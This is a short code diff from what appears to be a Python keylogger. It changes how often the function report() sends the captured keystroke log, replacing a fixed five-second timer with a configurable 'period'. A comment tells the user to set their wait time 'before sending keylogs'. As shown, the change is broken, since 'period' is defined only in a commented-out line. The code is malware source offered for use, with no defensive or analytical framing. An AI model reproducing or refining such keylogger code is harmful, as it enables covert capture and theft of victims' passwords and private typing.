@@ -29,7 +29,11 @@ def report():
     global log
     send(log)
     log=""
-    timer=threading.Timer(5,report)
+    
+    #uncomment and put ur desired wait time before sending keylogs..
+    #period=5
+    
+    timer=threading.Timer(period,report)
     timer.start()
 
 def process_key_press(key):
